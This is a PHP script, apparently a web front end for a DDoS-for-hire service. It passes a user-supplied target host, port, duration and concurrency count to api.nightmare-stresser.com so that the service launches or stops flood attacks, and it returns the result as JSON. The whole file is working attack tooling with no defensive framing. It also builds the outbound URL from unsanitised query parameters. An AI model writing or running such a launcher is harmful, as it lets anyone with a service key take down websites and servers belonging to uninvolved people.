<?php
// Enable error reporting for debugging
error_reporting(E_ALL);
ini_set('display_errors', 1);

// Set headers
header('Content-Type: application/json');

// Function to make API request
function makeApiRequest($url) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    
    return [
        'response' => $response,
        'status' => $httpCode
    ];
}

// Check if required parameters are present
if (!isset($_GET['key']) || !isset($_GET['method'])) {
    echo json_encode([
        'status' => 'error',
        'message' => 'Missing required parameters: key and method are required'
    ]);
    exit;
}

// Get parameters
$key = $_GET['key'];
$method = strtoupper($_GET['method']); // Convert method to uppercase
$host = isset($_GET['host']) ? $_GET['host'] : '';
$port = isset($_GET['port']) ? $_GET['port'] : '';
$time = isset($_GET['time']) ? $_GET['time'] : '';
$concurrents = isset($_GET['concurrents']) ? $_GET['concurrents'] : '';

// Base API URL
$baseUrl = "https://api.nightmare-stresser.com/";

// Construct API URL based on method
if ($method === 'STOPALL') {
    $apiUrl = $baseUrl . "?key=$key&method=STOPALL";
} else {
    // Validate additional parameters for attack and stop methods
    if (empty($host) || empty($port) || empty($time)) {
        echo json_encode([
            'status' => 'error',
            'message' => 'Host, port, and time are required for attack and stop methods'
        ]);
        exit;
    }
    
    $apiUrl = $baseUrl . "?key=$key&method=$method&host=$host&port=$port&time=$time";
    if (!empty($concurrents)) {
        $apiUrl .= "&concurrents=$concurrents";
    }
}

// Make the API request
$result = makeApiRequest($apiUrl);

// Prepare response
$response = [
    'status' => $result['status'] === 200 ? 'success' : 'error',
    'original_response' => $result['response'],
    'http_code' => $result['status']
];

// Output response
echo json_encode($response, JSON_PRETTY_PRINT);

?>
